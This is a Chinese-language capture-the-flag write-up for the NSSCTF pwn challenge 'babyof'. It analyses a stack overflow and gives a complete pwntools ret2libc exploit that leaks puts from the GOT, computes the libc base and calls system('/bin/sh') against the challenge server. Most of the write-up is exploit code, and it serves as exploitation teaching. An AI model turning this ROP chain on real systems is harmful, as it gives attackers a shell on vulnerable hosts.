# nssctf babyof wp


## 题面
就一个二进制文件提示：  
Ubuntu18 （没🥚用）  
## 分析
``` bash
❯ pwn checksec --file=babyof
[*] '/data/project/ctf-repo/pwn/nssctf/babyof/babyof'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
```

amd64。  
ida 反编译：  
main()->sub_400632()  

```c
int sub_400632()
{
  _BYTE buf[64]; // [rsp+0h] [rbp-40h] BYREF

  puts("Do you know how to do buffer overflow?");
  read(0, buf, 0x100u);
  return puts("I hope you win");
}
```

可栈溢出，但仅此而已。没有 system 和 execve 可以利用。    
## 利用
一看就是 ret2libc。  
程序有 puts，可以利用 puts 来泄漏 puts 的真实地址，从而拿到 libc 的基址。  
看看 ROP 找到 pop rdi;ret; 可以用：  
```
0x0000000000400743 : pop rdi ; ret
0x0000000000400506 : ret
```

第一次利用 puts.plt 执行读取 puts.got 并获得 puts 的地址，并再次跳回函数执行第二次利用获得 shell。  
``` python
io = remote("node4.anna.nssctf.cn", 24331)
elf = ELF("./babyof")
libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")

ret_addr = 0x400506
pop_rdi_addr = 0x400743
begin_addr = 0x400632
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]

payload = (
    b"a" * (0x40 + 8)
    + p64(pop_rdi_addr)
    + p64(puts_got)
    + p64(puts_plt)
    + p64(begin_addr)
)
io.sendafter(b"overflow?\n", payload)
puts_addr = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
```

得到 puts 地址: `0x7f3013d51aa0` 用这串数字到 [https://libc.blukat.me/](https://libc.blukat.me/) 找到对应版本的 libc 实际上还可以再泄漏一个 read 函数的地址：`140` 这样配合得到对应版本: libc6_2.27-3ubuntu1.4_amd64。  
得到 libc 之后就能得到 /bin/sh 和 system。  
``` python
libc_base = puts_addr - libc.sym["puts"]
bin_sh_addr = libc_base + next(libc.search(b"/bin/sh\x00"))
system_addr = libc_base + libc.sym["system"]
payload = (
    b"a" * (0x40 + 8)
    + p64(ret_addr)
    + p64(pop_rdi_addr)
    + p64(bin_sh_addr)
    + p64(system_addr)
)
io.send(payload)
io.interactive()
```
这里在最开始需要一个 ret 来栈对齐，否则调用 system 会死掉，进不去 shell。  
## exp
完整 exp
``` python
from pwn import *

context(arch="amd64", os="linux", log_level="info")
context.gdb_binary = "/bin/pwndbg"
#io = process("./babyof")
io = remote("node4.anna.nssctf.cn", 24331)

elf = ELF("./babyof")
libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")

ret_addr = 0x400506
pop_rdi_addr = 0x400743
main_addr = 0x400632

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]

payload = (
    b"a" * (0x40 + 8)
    + p64(pop_rdi_addr)
    + p64(puts_got)
    + p64(puts_plt)
    + p64(main_addr)
)


io.sendafter(b"overflow?\n", payload)
puts_addr = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
"""
接收直到遇到 0x7f（因为 Linux 用户态的 libc 总是以 0x7f 开头）
[-6:] 取最后 6 个字节， 64 位地址虽然占 8 字节，但实际有效的只有低 48 位（6 字节），高 16 位是符号扩展。
"""

print("puts address = ", hex(puts_addr))
libc_base = puts_addr - libc.sym["puts"]
bin_sh_addr = libc_base + next(libc.search(b"/bin/sh\x00"))
system_addr = libc_base + libc.sym["system"]
payload = (
    b"a" * (0x40 + 8)
    + p64(ret_addr)
    + p64(pop_rdi_addr)
    + p64(bin_sh_addr)
    + p64(system_addr)
)
io.send(payload)
io.interactive()
```
